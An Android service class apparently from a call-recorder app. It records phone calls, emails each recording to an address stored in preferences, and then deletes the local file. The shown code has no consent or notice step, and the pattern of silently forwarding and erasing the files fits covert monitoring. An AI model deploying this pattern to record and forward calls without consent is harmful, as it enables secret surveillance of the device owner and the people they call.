package com.example.callrecorder;

import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;

public class CallRecordingService extends Service {
    private MediaRecorder mediaRecorder;
    private String audioFile;
    private boolean isRecording = false;
    private SharedPreferences sharedPreferences;
    private String deviceName;

    @Override
    public void onCreate() {
        super.onCreate();
        sharedPreferences = getSharedPreferences("CallRecorderPrefs", MODE_PRIVATE);
        deviceName = getDeviceName();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private String getDeviceName() {
        String manufacturer = Build.MANUFACTURER;
        String model = Build.MODEL;
        if (model.startsWith(manufacturer)) {
            return capitalize(model);
        } else {
            return capitalize(manufacturer) + " " + model;
        }
    }

    private String capitalize(String s) {
        if (s == null || s.length() == 0) {
            return "";
        }
        char first = s.charAt(0);
        if (Character.isUpperCase(first)) {
            return s;
        } else {
            return Character.toUpperCase(first) + s.substring(1);
        }
    }

    public void startRecording() {
        try {
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            
            String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
            audioFile = getExternalFilesDir(null).getAbsolutePath() + "/" + timeStamp + ".3gp";
            
            mediaRecorder.setOutputFile(audioFile);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            
            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;
            Log.d("CallRecorder", "Recording started: " + audioFile);
        } catch (Exception e) {
            Log.e("CallRecorder", "Recording failed", e);
        }
    }

    public void stopRecordingAndSendEmail() {
        if (isRecording) {
            try {
                mediaRecorder.stop();
                mediaRecorder.release();
                isRecording = false;
                
                String senderEmail = sharedPreferences.getString("sender_email", "");
                String appPassword = sharedPreferences.getString("app_password", "");
                String receiverEmail = sharedPreferences.getString("receiver_email", "");
                
                String subject = "Call Recording from " + deviceName;
                String body = "Call recording attached from device: " + deviceName;
                
                EmailSender.sendEmail(this, senderEmail, appPassword, receiverEmail, subject, body, audioFile);
                
                new File(audioFile).delete();
                Log.d("CallRecorder", "Recording stopped and email sent");
            } catch (Exception e) {
                Log.e("CallRecorder", "Error stopping recording", e);
            }
        }
    }
}
